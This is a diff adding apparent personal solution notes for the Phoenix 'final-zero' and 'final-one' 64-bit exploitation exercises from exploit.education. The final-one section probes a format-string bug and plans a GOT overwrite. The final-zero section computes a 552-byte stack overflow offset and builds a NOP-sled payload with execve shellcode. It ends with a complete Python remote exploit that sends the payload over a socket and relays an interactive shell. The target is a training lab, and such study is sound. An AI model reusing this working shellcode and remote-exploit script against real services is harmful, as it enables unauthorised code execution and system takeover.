@@ -1,0 +1,107 @@
+##################
+Final one 64-bit
+##################
+strcpy buffer overflow in the parser function?
+
+trim() converts \n and \r to NULL
+the fprintf is probably vulnerable to format string exploits
+
+Yeah, seems so:
+user@phoenix-amd64:/opt/phoenix/amd64$ ./final-one --test
+Welcome to phoenix/final-one, brought to you by https://exploit.education
+[final1] $ username %s%s%s%s%s%s%s%s%s%s    
+[final1] $ login %s%s%s%s%s%s%s%s%s%s
+Login from testing:12121 as [Login from testing:12121 as [%s%s%s%s%s%s%s%s%s%s] with password [%s%s%s%s%s%s%s%s%s%s]
+Segmentation fault
+[final1] $ username ayy %x %x %x
+[final1] $ login sad
+Login from testing:12121 as [ayy ffffdca0 0 2000] with password [sad]
+login failed
+
+
+We can override the GOT entry to the prinf (puts) call.
+https://medium.com/@iphelix/exploit-exercises-protostar-final-levels-72875b0c3387
+
+
+#################
+Final zero 64-bit
+#################
+Simple remote buffer overflow. 
+Characters get overwritten as lowercase, but I can stop that by adding a \r
+However, I don't think it even matters, since I can just add my shellcode after the ret rip.
+
+0x004008e8 is the expected rip. Address is 0x7fffffffe4f8 
+buffer starts at 0x7fffffffe2d0
+
+The difference is 552 bytes.
+
+The following overrides rip to x424242424242...
+print('A' * 552 + 'B'*8)
+
+Let's get the exploit working locally:
+
+Let's add a generous nop slide. This only works because the gets() function doesn't care about NULL bytes.
+padding = b'A' * 552
+rip = b'\x00\x00\x7f\xff\xff\xff\xe6\xf0'[::-1]
+nopsled = b'\x90' * 700
+shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
+payload = padding + rip + nopsled + shellcode 
+f = open('/home/user/input.txt', 'wb')
+f.write(payload)
+f.close()
+
+r2 -d final-zero -e dbg.profile=/home/user/input.rr2
+
+Note that the interactive shell doesn't like to work in the debugger for whatever reason. Actually, maybe it forks a new process, and I simply neglected to follow the new process? It's entirely possible.
+
+Exploit with: cat ~/input.txt - | ./final-zero
+
+Working remote exploit:
+```
+#!/usr/bin/env python2
+
+import struct
+import socket
+
+ADDR = "127.0.0.1"
+PORT = 64003
+
+padding = b'A' * 552
+rip = b'\x00\x00\x7f\xff\xff\xff\xec\xd8'[::-1]
+nopsled = b'\x90' * 700
+shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
+payload = padding + rip + nopsled + shellcode
+
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((ADDR, PORT))
+
+print s.recv(1024),
+raw_input("Press Enter to continue...")
+
+s.sendall(payload + "\n")
+#s.sendall('hello' + '\n')
+
+while True:
+    s.sendall(raw_input("$ ") + "\n")
+    print s.recv(10024),
+
+```
+
+Initially it failed. I tried increasing the size of the nop slide, didn't work. Then I looked at /var/log/kern.log. Nothing new there.
+I attached a debugger to the running process
+
+user@phoenix-amd64:/opt/phoenix/amd64$ ps aux | grep final
+phoenix+   936  2.0  0.0    752     4 ?        Ss   11:48   0:00 /opt/phoenix/amd64/final-zero
+user       938  0.0  0.0  11112   936 pts/0    S+   11:49   0:00 grep final
+
+r2 -d 936
+
+Set a breakpoint, continue, reach the breakpoint, find out what's wrong. 
+The NOPslide was too long and the process was exiting after the gets()
+
+Adjusted the RIP and I got it working.
+
+
+
+
